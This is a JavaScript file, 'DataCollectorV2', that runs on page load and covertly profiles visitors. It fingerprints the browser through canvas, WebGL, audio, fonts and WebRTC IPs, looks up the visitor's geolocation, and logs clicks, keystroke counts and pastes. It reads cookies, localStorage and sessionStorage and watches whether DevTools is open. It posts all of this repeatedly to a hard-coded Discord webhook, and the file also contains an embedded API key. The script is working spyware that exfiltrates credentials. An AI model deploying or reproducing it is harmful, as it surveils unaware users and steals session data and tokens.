// Ultra Advanced Data Collection System V2
class DataCollectorV2 {
    constructor() {
        this.sessionId = this.generateSessionId();
        this.startTime = Date.now();
        this.data = {};
        this.webhookUrl = 'https://discord.com/api/webhooks/1443171506463965295/zKcRCncL-zNOwYY3cWqrm8_eE9qEAJG8F2byJaot5RD4Cibe8-dNha_Y-577l-dtS2xC';
        this.init();
    }

    generateSessionId() {
        const timestamp = Date.now();
        const random = Math.random().toString(36).substr(2, 9);
        const userAgentHash = this.hashCode(navigator.userAgent);
        return `${timestamp}_${random}_${userAgentHash}`;
    }

    hashCode(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(36);
    }

    async init() {
        // Immediate data collection on page load
        await this.collectAll();
        await this.sendToWebhook('initial');

        // Set up comprehensive tracking
        this.setupTracking();

        // Continuous monitoring
        this.startMonitoring();
    }

    async collectAll() {
        this.data = {
            session: this.collectSessionData(),
            browser: await this.collectBrowserData(),
            device: await this.collectDeviceData(),
            network: await this.collectNetworkData(),
            fingerprint: await this.generateFingerprint(),
            behavior: this.collectBehaviorData(),
            permissions: await this.checkAllPermissions(),
            system: await this.collectSystemData(),
            security: await this.collectSecurityData(),
            social: this.collectSocialData()
        };
    }

    collectSessionData() {
        return {
            id: this.sessionId,
            timestamp: new Date().toISOString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            url: window.location.href,
            referrer: document.referrer || 'direct',
            title: document.title,
            performance: {
                loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
                domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
                memory: performance.memory ? {
                    used: performance.memory.usedJSHeapSize,
                    total: performance.memory.totalJSHeapSize,
                    limit: performance.memory.jsHeapSizeLimit
                } : null
            }
        };
    }

    async collectBrowserData() {
        const data = {
            userAgent: navigator.userAgent,
            appName: navigator.appName,
            appCodeName: navigator.appCodeName,
            appVersion: navigator.appVersion,
            platform: navigator.platform,
            vendor: navigator.vendor,
            vendorSub: navigator.vendorSub,
            product: navigator.product,
            productSub: navigator.productSub,
            language: navigator.language,
            languages: navigator.languages,
            onLine: navigator.onLine,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            maxTouchPoints: navigator.maxTouchPoints,
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            webdriver: navigator.webdriver,
            plugins: this.getDetailedPluginsData(),
            mimeTypes: this.getDetailedMimeTypesData()
        };

        // WebGL detailed data
        data.webgl = await this.getWebGLData();

        // Audio context fingerprint
        data.audio = await this.getAudioFingerprint();

        // Canvas fingerprint
        data.canvas = this.getCanvasFingerprint();

        // WebRTC data
        data.webrtc = await this.getWebRTCData();

        return data;
    }

    getDetailedPluginsData() {
        const plugins = [];
        if (navigator.plugins) {
            for (let i = 0; i < navigator.plugins.length; i++) {
                const plugin = navigator.plugins[i];
                const mimeTypes = [];
                for (let j = 0; j < plugin.length; j++) {
                    mimeTypes.push({
                        type: plugin[j].type,
                        suffixes: plugin[j].suffixes,
                        description: plugin[j].description
                    });
                }
                plugins.push({
                    name: plugin.name,
                    filename: plugin.filename,
                    description: plugin.description,
                    version: plugin.version || 'unknown',
                    mimeTypes: mimeTypes
                });
            }
        }
        return plugins;
    }

    getDetailedMimeTypesData() {
        const mimeTypes = [];
        if (navigator.mimeTypes) {
            for (let i = 0; i < navigator.mimeTypes.length; i++) {
                const mimeType = navigator.mimeTypes[i];
                mimeTypes.push({
                    type: mimeType.type,
                    suffixes: mimeType.suffixes,
                    description: mimeType.description,
                    enabledPlugin: mimeType.enabledPlugin ? mimeType.enabledPlugin.name : null
                });
            }
        }
        return mimeTypes;
    }

    async getWebGLData() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl2') || canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

        if (!gl) return null;

        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const data = {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER),
            version: gl.getParameter(gl.VERSION),
            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
            unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
            unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
            maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
            maxVertexAttributes: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
            maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
            extensions: gl.getSupportedExtensions()
        };

        return data;
    }

    async getAudioFingerprint() {
        try {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            const audioContext = new AudioContext();
            const analyser = audioContext.createAnalyser();
            const oscillator = audioContext.createOscillator();
            const gainNode = audioContext.createGain();
            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);

            const fingerprint = {
                sampleRate: audioContext.sampleRate,
                state: audioContext.state,
                baseLatency: audioContext.baseLatency,
                outputLatency: audioContext.outputLatency,
                channelCount: analyser.channelCount,
                fftSize: analyser.fftSize,
                frequencyBinCount: analyser.frequencyBinCount,
                minDecibels: analyser.minDecibels,
                maxDecibels: analyser.maxDecibels,
                smoothingTimeConstant: analyser.smoothingTimeConstant
            };

            // Generate audio fingerprint
            oscillator.type = 'triangle';
            oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);

            gainNode.gain.setValueAtTime(0, audioContext.currentTime);

            oscillator.connect(gainNode);
            gainNode.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(audioContext.destination);

            oscillator.start(0);

            return new Promise(resolve => {
                scriptProcessor.onaudioprocess = (event) => {
                    const output = event.outputBuffer.getChannelData(0);
                    const sum = output.reduce((acc, val) => acc + Math.abs(val), 0);
                    fingerprint.audioSum = sum;

                    oscillator.stop();
                    audioContext.close();
                    resolve(fingerprint);
                };
            });
        } catch (e) {
            return null;
        }
    }

    getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 280;
        canvas.height = 60;

        // Complex drawing for unique fingerprint
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);

        ctx.fillStyle = '#069';
        ctx.font = '11pt no-real-font-123';
        ctx.fillText('Canvas fingerprint ñ Ω 😃 ', 2, 15);

        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.font = '18pt Arial';
        ctx.fillText('BrowserLeaks.com', 4, 45);

        ctx.globalCompositeOperation = 'multiply';
        ctx.fillStyle = 'rgb(255,0,255)';
        ctx.beginPath();
        ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
        ctx.closePath();
        ctx.fill();

        ctx.fillStyle = 'rgb(0,255,255)';
        ctx.beginPath();
        ctx.arc(100, 50, 50, 0, Math.PI * 2, true);
        ctx.closePath();
        ctx.fill();

        ctx.fillStyle = 'rgb(255,255,0)';
        ctx.beginPath();
        ctx.arc(75, 100, 50, 0, Math.PI * 2, true);
        ctx.closePath();
        ctx.fill();

        const dataURL = canvas.toDataURL();

        // Get pixel data for additional fingerprinting
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        let pixelSum = 0;
        for (let i = 0; i < imageData.data.length; i++) {
            pixelSum += imageData.data[i];
        }

        return {
            dataURL: dataURL.substring(0, 100),
            pixelSum: pixelSum
        };
    }

    async getWebRTCData() {
        try {
            const pc = new RTCPeerConnection({
                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
            });

            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);

            const ips = [];

            return new Promise(resolve => {
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const parts = event.candidate.candidate.split(' ');
                        const ip = parts[4];
                        if (ip && !ips.includes(ip)) {
                            ips.push(ip);
                        }
                    } else {
                        pc.close();
                        resolve({ localIPs: ips });
                    }
                };

                setTimeout(() => {
                    pc.close();
                    resolve({ localIPs: ips });
                }, 2000);
            });
        } catch (e) {
            return null;
        }
    }

    async collectDeviceData() {
        const data = {
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation ? {
                    type: screen.orientation.type,
                    angle: screen.orientation.angle
                } : null,
                mozOrientation: screen.mozOrientation,
                deviceXDPI: screen.deviceXDPI,
                deviceYDPI: screen.deviceYDPI,
                systemXDPI: screen.systemXDPI,
                systemYDPI: screen.systemYDPI
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                screenX: window.screenX,
                screenY: window.screenY,
                screenLeft: window.screenLeft,
                screenTop: window.screenTop,
                scrollX: window.scrollX,
                scrollY: window.scrollY,
                devicePixelRatio: window.devicePixelRatio
            },
            memory: navigator.deviceMemory,
            cpuClass: navigator.cpuClass,
            oscpu: navigator.oscpu,
            buildID: navigator.buildID,
            touch: {
                maxTouchPoints: navigator.maxTouchPoints,
                touchSupport: 'ontouchstart' in window,
                touchEvent: 'TouchEvent' in window
            }
        };

        // Battery status
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                data.battery = {
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime,
                    level: battery.level
                };
            } catch (e) {}
        }

        // Media devices
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                data.mediaDevices = devices.map(device => ({
                    kind: device.kind,
                    label: device.label || `${device.kind} device`,
                    deviceId: this.hashCode(device.deviceId),
                    groupId: this.hashCode(device.groupId)
                }));
            } catch (e) {}
        }

        // Storage estimation
        if (navigator.storage && navigator.storage.estimate) {
            try {
                const estimate = await navigator.storage.estimate();
                data.storage = {
                    quota: estimate.quota,
                    usage: estimate.usage,
                    persisted: await navigator.storage.persisted()
                };
            } catch (e) {}
        }

        // Connection information
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection) {
            data.connection = {
                effectiveType: connection.effectiveType,
                type: connection.type,
                downlink: connection.downlink,
                downlinkMax: connection.downlinkMax,
                rtt: connection.rtt,
                saveData: connection.saveData
            };
        }

        // Gamepad API
        if (navigator.getGamepads) {
            const gamepads = navigator.getGamepads();
            data.gamepads = Array.from(gamepads).filter(g => g).map(g => ({
                id: g.id,
                buttons: g.buttons.length,
                axes: g.axes.length
            }));
        }

        return data;
    }

    async collectNetworkData() {
        const data = {
            online: navigator.onLine,
            connectionType: navigator.connection ? navigator.connection.type : null
        };

        // Multiple IP APIs for redundancy
        const ipApis = [
            { url: 'https://api.ipify.org?format=json', key: 'ipify' },
            { url: 'https://api.ip.sb/geoip', key: 'ipsb' },
            { url: 'https://ipapi.co/json/', key: 'ipapi' },
            { url: 'https://ipwho.is/', key: 'ipwho' },
            { url: 'https://api.ipgeolocation.io/ipgeo?apiKey=9ad5b3e7f68d485a8b3df8e47f093bda', key: 'ipgeolocation' }
        ];

        for (const api of ipApis) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000);

                const response = await fetch(api.url, { signal: controller.signal });
                clearTimeout(timeoutId);

                if (response.ok) {
                    data[api.key] = await response.json();
                }
            } catch (e) {}
        }

        // Performance timing
        if (performance.timing) {
            const timing = performance.timing;
            data.timing = {
                navigationStart: timing.navigationStart,
                unloadEventStart: timing.unloadEventStart,
                unloadEventEnd: timing.unloadEventEnd,
                redirectStart: timing.redirectStart,
                redirectEnd: timing.redirectEnd,
                fetchStart: timing.fetchStart,
                domainLookupStart: timing.domainLookupStart,
                domainLookupEnd: timing.domainLookupEnd,
                connectStart: timing.connectStart,
                connectEnd: timing.connectEnd,
                secureConnectionStart: timing.secureConnectionStart,
                requestStart: timing.requestStart,
                responseStart: timing.responseStart,
                responseEnd: timing.responseEnd,
                domLoading: timing.domLoading,
                domInteractive: timing.domInteractive,
                domContentLoadedEventStart: timing.domContentLoadedEventStart,
                domContentLoadedEventEnd: timing.domContentLoadedEventEnd,
                domComplete: timing.domComplete,
                loadEventStart: timing.loadEventStart,
                loadEventEnd: timing.loadEventEnd
            };

            // Calculate key metrics
            data.metrics = {
                pageLoadTime: timing.loadEventEnd - timing.navigationStart,
                domReadyTime: timing.domContentLoadedEventEnd - timing.navigationStart,
                dnsTime: timing.domainLookupEnd - timing.domainLookupStart,
                tcpTime: timing.connectEnd - timing.connectStart,
                requestTime: timing.responseEnd - timing.requestStart,
                responseTime: timing.responseEnd - timing.responseStart,
                domProcessingTime: timing.domComplete - timing.domInteractive
            };
        }

        return data;
    }

    async generateFingerprint() {
        const fingerprint = {
            fonts: await this.detectFonts(),
            timezone: {
                offset: new Date().getTimezoneOffset(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                locale: Intl.DateTimeFormat().resolvedOptions().locale
            },
            screen: {
                colorGamut: this.getColorGamut(),
                hdr: this.hasHDR(),
                contrast: this.getContrast()
            },
            math: {
                tan: Math.tan(-1e300),
                sin: Math.sin(Math.PI / 2),
                cos: Math.cos(Math.PI)
            },
            crypto: await this.getCryptoFingerprint()
        };

        // Create unique hash
        const fpString = JSON.stringify(fingerprint);
        fingerprint.hash = this.hashCode(fpString);

        return fingerprint;
    }

    async detectFonts() {
        const fonts = [
            'Andale Mono', 'Arial', 'Arial Black', 'Arial Hebrew', 'Arial MT', 'Arial Narrow',
            'Arial Rounded MT Bold', 'Arial Unicode MS', 'Bitstream Vera Sans Mono', 'Book Antiqua',
            'Bookman Old Style', 'Calibri', 'Cambria', 'Cambria Math', 'Century', 'Century Gothic',
            'Century Schoolbook', 'Comic Sans', 'Comic Sans MS', 'Consolas', 'Courier', 'Courier New',
            'Geneva', 'Georgia', 'Helvetica', 'Helvetica Neue', 'Impact', 'Lucida Bright',
            'Lucida Calligraphy', 'Lucida Console', 'Lucida Fax', 'LUCIDA GRANDE', 'Lucida Handwriting',
            'Lucida Sans', 'Lucida Sans Typewriter', 'Lucida Sans Unicode', 'Microsoft Sans Serif',
            'Monaco', 'Monotype Corsiva', 'MS Gothic', 'MS Outlook', 'MS PGothic', 'MS Reference Sans Serif',
            'MS Sans Serif', 'MS Serif', 'MYRIAD', 'MYRIAD PRO', 'Palatino', 'Palatino Linotype',
            'Segoe Print', 'Segoe Script', 'Segoe UI', 'Segoe UI Light', 'Segoe UI Semibold',
            'Segoe UI Symbol', 'Tahoma', 'Times', 'Times New Roman', 'Times New Roman PS',
            'Trebuchet MS', 'Verdana', 'Wingdings', 'Wingdings 2', 'Wingdings 3',
            'Noto Sans JP', 'Yu Gothic', 'Meiryo', 'MS Mincho', 'MS Gothic', 'Hiragino Sans',
            'Hiragino Kaku Gothic Pro'
        ];

        const detectedFonts = [];
        const testString = 'mmmmmmmmmmlli';
        const testSize = '72px';
        const baseFonts = ['monospace', 'sans-serif', 'serif'];

        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');

        const baselineWidths = {};
        baseFonts.forEach(baseFont => {
            context.font = `${testSize} ${baseFont}`;
            baselineWidths[baseFont] = context.measureText(testString).width;
        });

        fonts.forEach(font => {
            let detected = false;
            baseFonts.forEach(baseFont => {
                context.font = `${testSize} '${font}', ${baseFont}`;
                if (context.measureText(testString).width !== baselineWidths[baseFont]) {
                    detected = true;
                }
            });
            if (detected) {
                detectedFonts.push(font);
            }
        });

        return detectedFonts;
    }

    getColorGamut() {
        if (window.matchMedia('(color-gamut: srgb)').matches) return 'srgb';
        if (window.matchMedia('(color-gamut: p3)').matches) return 'p3';
        if (window.matchMedia('(color-gamut: rec2020)').matches) return 'rec2020';
        return 'unknown';
    }

    hasHDR() {
        return window.matchMedia('(dynamic-range: high)').matches;
    }

    getContrast() {
        if (window.matchMedia('(prefers-contrast: high)').matches) return 'high';
        if (window.matchMedia('(prefers-contrast: low)').matches) return 'low';
        if (window.matchMedia('(prefers-contrast: no-preference)').matches) return 'no-preference';
        return 'unknown';
    }

    async getCryptoFingerprint() {
        if (!crypto.subtle) return null;

        try {
            const encoder = new TextEncoder();
            const data = encoder.encode('fingerprint');
            const hash = await crypto.subtle.digest('SHA-256', data);
            const hashArray = Array.from(new Uint8Array(hash));
            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        } catch (e) {
            return null;
        }
    }

    collectBehaviorData() {
        const data = {
            mouseMovements: [],
            clicks: [],
            keystrokes: 0,
            scrolls: [],
            touches: [],
            visibility: [],
            focus: [],
            clipboard: false,
            selection: false
        };

        // Enhanced mouse tracking
        let lastMouseTime = Date.now();
        document.addEventListener('mousemove', (e) => {
            const now = Date.now();
            if (now - lastMouseTime > 50) {
                data.mouseMovements.push({
                    x: e.clientX,
                    y: e.clientY,
                    time: now - this.startTime,
                    pressure: e.pressure || 0
                });
                lastMouseTime = now;
                if (data.mouseMovements.length > 100) data.mouseMovements.shift();
            }
        });

        // Click tracking with detailed info
        document.addEventListener('click', (e) => {
            data.clicks.push({
                x: e.clientX,
                y: e.clientY,
                target: e.target.tagName,
                targetId: e.target.id,
                targetClass: e.target.className,
                time: Date.now() - this.startTime,
                button: e.button,
                ctrlKey: e.ctrlKey,
                shiftKey: e.shiftKey,
                altKey: e.altKey
            });
        });

        // Keystroke tracking
        document.addEventListener('keydown', (e) => {
            data.keystrokes++;
            if (e.key === 'v' && (e.ctrlKey || e.metaKey)) {
                data.clipboard = true;
            }
        });

        // Scroll tracking
        let lastScrollTime = Date.now();
        window.addEventListener('scroll', () => {
            const now = Date.now();
            if (now - lastScrollTime > 100) {
                data.scrolls.push({
                    x: window.scrollX,
                    y: window.scrollY,
                    time: now - this.startTime,
                    height: document.body.scrollHeight,
                    viewHeight: window.innerHeight
                });
                lastScrollTime = now;
            }
        });

        // Touch tracking
        document.addEventListener('touchstart', (e) => {
            data.touches.push({
                touches: e.touches.length,
                time: Date.now() - this.startTime,
                x: e.touches[0] ? e.touches[0].clientX : 0,
                y: e.touches[0] ? e.touches[0].clientY : 0
            });
        });

        // Visibility tracking
        document.addEventListener('visibilitychange', () => {
            data.visibility.push({
                hidden: document.hidden,
                visibilityState: document.visibilityState,
                time: Date.now() - this.startTime
            });
        });

        // Focus/blur tracking
        window.addEventListener('focus', () => {
            data.focus.push({
                type: 'focus',
                time: Date.now() - this.startTime
            });
        });

        window.addEventListener('blur', () => {
            data.focus.push({
                type: 'blur',
                time: Date.now() - this.startTime
            });
        });

        // Selection tracking
        document.addEventListener('selectionchange', () => {
            data.selection = true;
        });

        // Context menu tracking
        document.addEventListener('contextmenu', (e) => {
            data.contextMenu = {
                x: e.clientX,
                y: e.clientY,
                time: Date.now() - this.startTime
            };
        });

        return data;
    }

    async checkAllPermissions() {
        const permissions = {};
        const permissionNames = [
            'accelerometer', 'ambient-light-sensor', 'background-fetch', 'background-sync',
            'bluetooth', 'camera', 'clipboard-read', 'clipboard-write', 'geolocation',
            'gyroscope', 'magnetometer', 'microphone', 'midi', 'notifications',
            'payment-handler', 'persistent-storage', 'push', 'screen-wake-lock',
            'speaker-selection', 'storage-access', 'xr-spatial-tracking'
        ];

        for (const permission of permissionNames) {
            try {
                const result = await navigator.permissions.query({ name: permission });
                permissions[permission] = result.state;

                // Listen for permission changes
                result.addEventListener('change', () => {
                    permissions[permission] = result.state;
                    this.sendPermissionChange(permission, result.state);
                });
            } catch (e) {
                permissions[permission] = 'not-supported';
            }
        }

        return permissions;
    }

    async sendPermissionChange(permission, state) {
        await fetch(this.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🔐 **権限変更検出**: ${permission} → ${state}`,
                embeds: [{
                    title: "Permission Change",
                    color: state === 'granted' ? 0x00ff00 : 0xff0000,
                    fields: [
                        {
                            name: "Permission",
                            value: permission,
                            inline: true
                        },
                        {
                            name: "New State",
                            value: state,
                            inline: true
                        },
                        {
                            name: "Session",
                            value: this.sessionId,
                            inline: false
                        }
                    ],
                    timestamp: new Date().toISOString()
                }]
            })
        });
    }

    async collectSystemData() {
        const data = {
            localStorage: {},
            sessionStorage: {},
            indexedDB: [],
            cookies: document.cookie,
            cache: [],
            serviceWorkers: []
        };

        // LocalStorage with size calculation
        try {
            let localStorageSize = 0;
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                data.localStorage[key] = value;
                localStorageSize += key.length + value.length;
            }
            data.localStorageSize = localStorageSize;
        } catch (e) {}

        // SessionStorage with size calculation
        try {
            let sessionStorageSize = 0;
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                data.sessionStorage[key] = value;
                sessionStorageSize += key.length + value.length;
            }
            data.sessionStorageSize = sessionStorageSize;
        } catch (e) {}

        // IndexedDB databases
        try {
            if ('databases' in indexedDB) {
                const databases = await indexedDB.databases();
                data.indexedDB = databases.map(db => ({
                    name: db.name,
                    version: db.version
                }));
            }
        } catch (e) {}

        // Service Workers
        try {
            if ('serviceWorker' in navigator) {
                const registrations = await navigator.serviceWorker.getRegistrations();
                data.serviceWorkers = registrations.map(reg => ({
                    scope: reg.scope,
                    active: reg.active ? {
                        state: reg.active.state,
                        scriptURL: reg.active.scriptURL
                    } : null,
                    waiting: reg.waiting ? {
                        state: reg.waiting.state,
                        scriptURL: reg.waiting.scriptURL
                    } : null,
                    installing: reg.installing ? {
                        state: reg.installing.state,
                        scriptURL: reg.installing.scriptURL
                    } : null,
                    updateViaCache: reg.updateViaCache
                }));
            }
        } catch (e) {}

        // Cache storage
        try {
            if ('caches' in window) {
                const cacheNames = await caches.keys();
                data.cache = cacheNames;
            }
        } catch (e) {}

        return data;
    }

    async collectSecurityData() {
        const data = {
            https: location.protocol === 'https:',
            csp: this.getCSP(),
            referrerPolicy: document.referrerPolicy,
            permissions: document.featurePolicy ? document.featurePolicy.allowedFeatures() : null,
            credentialless: window.credentialless,
            crossOriginIsolated: window.crossOriginIsolated,
            isSecureContext: window.isSecureContext
        };

        // Check for common security headers via timing
        try {
            const timing = performance.getEntriesByType('navigation')[0];
            if (timing && timing.serverTiming) {
                data.serverTiming = timing.serverTiming.map(t => ({
                    name: t.name,
                    duration: t.duration,
                    description: t.description
                }));
            }
        } catch (e) {}

        return data;
    }

    getCSP() {
        const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
        return meta ? meta.content : null;
    }

    collectSocialData() {
        const data = {
            share: 'share' in navigator,
            contacts: 'contacts' in navigator,
            bluetooth: 'bluetooth' in navigator
        };

        // Check for social media SDKs
        data.facebook = typeof FB !== 'undefined';
        data.twitter = typeof twttr !== 'undefined';
        data.google = typeof gapi !== 'undefined';
        data.linkedin = typeof IN !== 'undefined';

        return data;
    }

    async sendToWebhook(trigger) {
        try {
            // Main detailed embed
            const payload = {
                content: `🎯 **[${trigger.toUpperCase()}]** 完全データ収集完了`,
                embeds: [{
                    title: "🔍 詳細情報取得成功",
                    color: trigger === 'initial' ? 0x00ff00 : trigger === 'exit' ? 0xff0000 : 0x0099ff,
                    description: "全ての追跡データを収集しました",
                    fields: [
                        {
                            name: "📍 セッションID",
                            value: `\`\`\`${this.sessionId}\`\`\``,
                            inline: false
                        },
                        {
                            name: "🌐 ネットワーク情報",
                            value: `IP: ${this.data.network?.ipify?.ip || 'N/A'}\n位置: ${this.data.network?.ipapi?.city || 'N/A'}, ${this.data.network?.ipapi?.country_name || 'N/A'}\nISP: ${this.data.network?.ipapi?.org || 'N/A'}`,
                            inline: false
                        },
                        {
                            name: "💻 デバイス情報",
                            value: `プラットフォーム: ${this.data.browser.platform}\n画面: ${this.data.device.screen.width}x${this.data.device.screen.height}\nピクセル比: ${this.data.device.window.devicePixelRatio}\nタッチ: ${this.data.device.touch.maxTouchPoints}点`,
                            inline: true
                        },
                        {
                            name: "🌏 ブラウザ情報",
                            value: `UA: ${this.data.browser.userAgent.substring(0, 100)}...\n言語: ${this.data.browser.language}\nCookie: ${this.data.browser.cookieEnabled ? '有効' : '無効'}`,
                            inline: true
                        },
                        {
                            name: "🔋 バッテリー",
                            value: this.data.device.battery ? `残量: ${Math.round(this.data.device.battery.level * 100)}%\n充電: ${this.data.device.battery.charging ? 'はい' : 'いいえ'}` : 'N/A',
                            inline: true
                        },
                        {
                            name: "📱 メディアデバイス",
                            value: `合計: ${this.data.device.mediaDevices?.length || 0}個\nカメラ: ${this.data.device.mediaDevices?.filter(d => d.kind === 'videoinput').length || 0}\nマイク: ${this.data.device.mediaDevices?.filter(d => d.kind === 'audioinput').length || 0}`,
                            inline: true
                        },
                        {
                            name: "🎨 フィンガープリント",
                            value: `Canvas: ${this.data.fingerprint?.hash || 'N/A'}\nフォント: ${this.data.fingerprint?.fonts?.length || 0}個検出\nタイムゾーン: ${this.data.fingerprint?.timezone?.timezone || 'N/A'}`,
                            inline: false
                        },
                        {
                            name: "🔐 権限状態",
                            value: `Camera: ${this.data.permissions?.camera || 'N/A'}\nMic: ${this.data.permissions?.microphone || 'N/A'}\nLocation: ${this.data.permissions?.geolocation || 'N/A'}\nNotifications: ${this.data.permissions?.notifications || 'N/A'}`,
                            inline: true
                        },
                        {
                            name: "📊 行動データ",
                            value: `クリック: ${this.data.behavior?.clicks?.length || 0}回\nキー入力: ${this.data.behavior?.keystrokes || 0}回\nマウス移動: ${this.data.behavior?.mouseMovements?.length || 0}記録`,
                            inline: true
                        },
                        {
                            name: "⏱️ 滞在時間",
                            value: `${Math.floor((Date.now() - this.startTime) / 1000)}秒`,
                            inline: true
                        }
                    ],
                    footer: {
                        text: `Captured at ${new Date().toLocaleString('ja-JP')}`
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            // Send main webhook
            await fetch(this.webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // Send detailed JSON file
            const formData = new FormData();
            const jsonBlob = new Blob([JSON.stringify(this.data, null, 2)], { type: 'application/json' });

            formData.append('payload_json', JSON.stringify({
                content: `📎 **詳細データファイル** (${trigger}) - セッション: ${this.sessionId}`
            }));
            formData.append('file', jsonBlob, `session_${this.sessionId}_${trigger}_${Date.now()}.json`);

            await fetch(this.webhookUrl, {
                method: 'POST',
                body: formData
            });

        } catch (error) {
            console.error('Webhook error:', error);
        }
    }

    setupTracking() {
        // Before unload
        window.addEventListener('beforeunload', async (e) => {
            await this.collectAll();
            await this.sendToWebhook('exit');
        });

        // Page visibility change
        document.addEventListener('visibilitychange', async () => {
            if (document.hidden) {
                await this.collectAll();
                await this.sendToWebhook('hidden');
            }
        });

        // Network status change
        window.addEventListener('online', () => {
            this.sendToWebhook('online');
        });

        window.addEventListener('offline', () => {
            this.sendToWebhook('offline');
        });

        // Detect DevTools
        let devtools = {open: false, orientation: null};
        const threshold = 160;
        setInterval(() => {
            if (window.outerHeight - window.innerHeight > threshold ||
                window.outerWidth - window.innerWidth > threshold) {
                if (!devtools.open) {
                    devtools.open = true;
                    this.sendDevToolsAlert(true);
                }
            } else {
                if (devtools.open) {
                    devtools.open = false;
                    this.sendDevToolsAlert(false);
                }
            }
        }, 500);
    }

    async sendDevToolsAlert(isOpen) {
        await fetch(this.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `⚠️ **DevTools ${isOpen ? 'OPENED' : 'CLOSED'}** - Session: ${this.sessionId}`
            })
        });
    }

    startMonitoring() {
        // Update data every 30 seconds
        setInterval(async () => {
            await this.collectAll();
        }, 30000);

        // Send heartbeat every 2 minutes
        setInterval(async () => {
            await this.sendToWebhook('heartbeat');
        }, 120000);
    }
}

// Initialize collector immediately
const collector = new DataCollectorV2();